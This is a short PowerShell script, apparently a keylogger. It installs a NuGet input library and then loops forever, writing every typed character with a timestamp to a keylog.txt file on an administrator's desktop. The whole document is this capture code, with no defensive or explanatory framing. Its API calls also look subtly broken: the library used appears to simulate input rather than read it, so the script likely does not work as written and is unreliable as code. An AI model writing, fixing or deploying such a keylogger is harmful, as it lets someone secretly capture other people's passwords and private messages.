$LogFile = "C:\Users\Admin\Desktop\keylog.txt"

Function InstallInputSimulator {
    try {
        $InputSimulator = Get-Package -Name WindowsInput -ErrorAction Stop
        Write-Output "Windows Input Simulator already installed."
    }
    catch {
        Write-Output "Installing Windows Input Simulator..."
        Install-Package -Name WindowsInput -ProviderName NuGet -ForceBootstrap -Force
        Write-Output "Windows Input Simulator installed successfully."
    }
}

Function LogKeys {
    Add-Type -AssemblyName WindowsInput
    $Simulator = New-Object WindowsInput.InputSimulator

    while ($true) {
        $Key = $Simulator.Keyboard.ReadKey()
        $Char = $Key.KeyChar
        if ($Char -ne "`0") {
            Add-Content -Path $LogFile -Value "$([DateTime]::Now.ToString('yyyy-MM-dd HH:mm:ss')) - $Char"
        }
    }
}

InstallInputSimulator
LogKeys